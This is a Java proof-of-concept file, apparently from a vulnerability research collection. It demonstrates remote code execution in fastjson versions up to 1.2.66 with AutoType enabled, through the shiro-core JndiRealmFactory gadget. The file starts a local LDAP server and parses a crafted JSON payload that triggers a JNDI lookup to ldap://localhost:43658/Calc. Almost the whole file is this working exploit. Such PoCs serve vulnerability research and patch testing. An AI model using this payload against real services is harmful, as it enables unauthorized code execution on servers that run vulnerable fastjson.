package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.66 RCE，需要开启AutoType
 *
 *
 * shiro-core gadget
 *
 * <dependency>
 *       <groupId>org.apache.shiro</groupId>
 *       <artifactId>shiro-core</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class ShiroPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:43658/Calc\"], \"Realms\":[\"\"]}";//ldap方式
    System.out.println(payload.charAt(98));
    JSON.parse(payload);
  }
}
